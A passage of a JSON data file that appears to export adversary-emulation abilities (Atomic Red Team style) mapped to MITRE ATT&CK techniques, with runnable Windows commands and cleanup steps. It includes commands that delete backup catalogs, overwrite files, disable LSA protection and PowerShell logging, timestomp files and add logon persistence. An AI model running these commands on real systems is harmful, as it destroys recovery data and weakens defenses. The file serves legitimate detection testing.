timestamp with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Timestomp", "ability_id": "e2ef55e9867a99e2f056a73c041c1d7e", "technique_id": "T1070.006", "tactic": "defense-evasion", "requirements": [], "name": "Windows - Modify file last access timestamp with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Timestomp", "ability_id": "b3e9f59599e24e318d7a5292c2830362", "technique_id": "T1070.006", "tactic": "defense-evasion", "requirements": [], "name": "Windows - Modify file last modified timestamp with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (-not (Test-Path $env:TEMP\\T1485.txt)) { New-Item $env:TEMP\\T1485.txt -Force }; Invoke-Expression -Command \"$env:TEMP\\Sdelete\\sdelete.exe -accepteula $env:TEMP\\T1485.txt\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Destruction", "ability_id": "7b782764b73290661c9fe187a3a92a12", "technique_id": "T1485", "tactic": "impact", "requirements": [], "name": "Windows - Overwrite file with Sysinternals SDelete", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\Atomic-license.txt -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", \"$env:TEMP\\Atomic-license.txt\")", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "a88b5c13a1d5d6bdf02b66bc73411f41", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "Windows - PowerShell Download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "taskkill.exe /f /im spoolsv.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Service Stop", "ability_id": "fb5a68924b414467360a1a3550bd0fa2", "technique_id": "T1489", "tactic": "impact", "requirements": [], "name": "Windows - Stop service by killing process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc.exe start spooler >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc.exe stop spooler", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Service Stop", "ability_id": "6b666245c021b73f91449ae08a581eaf", "technique_id": "T1489", "tactic": "impact", "requirements": [], "name": "Windows - Stop service using Service Controller", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net.exe start spooler >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net.exe stop spooler", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Service Stop", "ability_id": "61a3e3faa588f1946a659139d6fd7a18", "technique_id": "T1489", "tactic": "impact", "requirements": [], "name": "Windows - Stop service using net.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:appdata\\Microsoft\\timestomp.ps1 -ErrorAction Ignore; Remove-Item $env:appdata\\Microsoft\\kxwn.lock -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "import-module $env:appdata\\Microsoft\\timestomp.ps1; timestomp -dest \"$env:appdata\\Microsoft\\kxwn.lock\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Timestomp", "ability_id": "3e78ff779dd7bfc558ae0e4d5319efcc", "technique_id": "T1070.006", "tactic": "defense-evasion", "requirements": [], "name": "Windows - Timestomp a File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wbadmin delete catalog -quiet", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "9e5e4c0655fd1b5be88bd40b8251175f", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - wbadmin Delete Windows Backup Catalog", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wbadmin delete systemstatebackup -keepVersions:0", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Inhibit System Recovery", "ability_id": "8af540e33bedd20ad6122751d2c996a2", "technique_id": "T1490", "tactic": "impact", "requirements": [], "name": "Windows - wbadmin Delete systemstatebackup", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "c228f0926d39e1ed5cfe8343adc1e684", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows Add Registry Value to Load Service in Safe Mode with Network", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "6e8a2c8f187fcca7926bfc95f72ee048", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows Add Registry Value to Load Service in Safe Mode without Network", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 3"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "c0d2e758c07d1ecb991ac940c3b6db73", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows Auto Update Option to Notify before download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses", "ability_id": "c7ec84be7b5a6e587c6a227da1e7b6c7", "technique_id": "T1562", "tactic": "defense-evasion", "requirements": [], "name": "Windows Disable LSA Protection", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "81c44eaf44a1fd04ef7bde11f64ac8bc", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows HideSCAHealth Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "3dcf8448a2a037af9d52abdc4199094f", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows HideSCANetwork Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "3ac22c2973506d82eae54d914e69b193", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows HideSCAPower Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "3c36afcd68b8139b52e7399c41e30959", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows HideSCAVolume Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["netsh trace stop >nul 2>&1 && TIMEOUT /T 5 >nul 2>&1 && del %temp%\\trace.etl >nul 2>&1 && del %temp%\\trace.cab >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "6881a4589710d53f0c146e91db513f01", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Windows Internal Packet Capture", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %TEMP%\\t1040.etl"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl && TIMEOUT /T 5 >nul 2>&1 && pktmon.exe stop", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "6623d6925383b47a30d6c7e5e8c4d752", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Windows Internal pktmon capture", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["pktmon filter remove"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pktmon.exe filter add -p 445", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "d9c719f978740efa1ed6db8fbc749706", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Windows Internal pktmon set filter", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic will utilize MOFComp.exe to load a local MOF file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\subscription\nA successful execution will add the class to WMI root namespace.\nReference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["715d8f_T1546.003.mof"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam_consumer'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam_filter'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "c:\\windows\\system32\\wbem\\mofcomp.exe 715d8f_T1546.003.mof", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription", "ability_id": "353949fcc1528656830ece93878589cb", "technique_id": "T1546.003", "tactic": "multiple", "requirements": [], "name": "Windows MOFComp.exe Load MOF File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "98c8abc9362d5a3da76d23980572b5e2", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Windows MachineGUID Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1 && reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "2ecf1916a791a659495a9b8a9367b996", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows Modify Show Compress Color And Info Tip Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1 && reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1 && reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f && reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "350c23947232688eeda9b7b2511732f5", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Windows Powershell Logging Disabled", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\T1113.png -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Add-Type -AssemblyName System.Windows.Forms; $screen = [Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic = [Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\\T1113.png\")", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "64569d9eb87191fc3cbf365a656e31ab", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "Windows Screen Capture (CopyFromScreen)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["rm c:\\temp\\T1113_desktop.zip -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W; [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c \"timeout 5 > NULL && psr.exe /stop\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "4025ac8133221487c20fd2bd6abeac4a", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "Windows Screencapture", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows 